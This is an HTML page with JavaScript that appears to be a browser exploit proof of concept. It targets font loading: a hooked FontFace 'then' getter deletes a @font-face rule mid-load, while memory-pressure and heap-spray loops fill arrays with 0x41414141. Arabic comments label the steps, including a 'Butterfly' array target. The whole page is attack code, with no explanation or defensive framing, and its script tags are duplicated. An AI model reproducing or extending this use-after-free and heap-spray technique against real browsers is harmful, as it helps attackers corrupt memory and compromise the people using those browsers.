<!DOCTYPE html>
<html>
<head>
    <style>body { background: #000; color: #0f0; font-family: monospace; }</style>
    <style id="fontStyle">@font-face { font-family: 'TargetFont'; src: url(nonexistent.woff); }</style>
</head>
<body>
    <div id="debug">System Ready...</div>

<script>
<script>
    let spray = [];
    let pressure = [];

    // 1. الضغط الذاكري: استنزاف الذاكرة المتاحة
    function createPressure() {
        for (let i = 0; i < 5000; i++) {
            pressure.push(new Array(64).fill(0x12345678));
        }
    }

    function trigger() {
        createPressure(); // ضغط الذاكرة
        
        let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
        document.fonts.add(font);

        Object.defineProperty(FontFace.prototype, 'then', {
            get() {
                // الحذف
                document.getElementById('fontStyle').sheet.deleteRule(0);
                
                // 2. الـ Spray المكثف في الفراغ
                for (let i = 0; i < 2000; i++) {
                    // استخدام JSArray (Butterfly target)
                    spray.push(new Array(32).fill(0x41414141));
                }
                return undefined;
            }
        });
        font.load();
    }

    setTimeout(trigger, 1000);
</script>

</script>

</body>
</html>
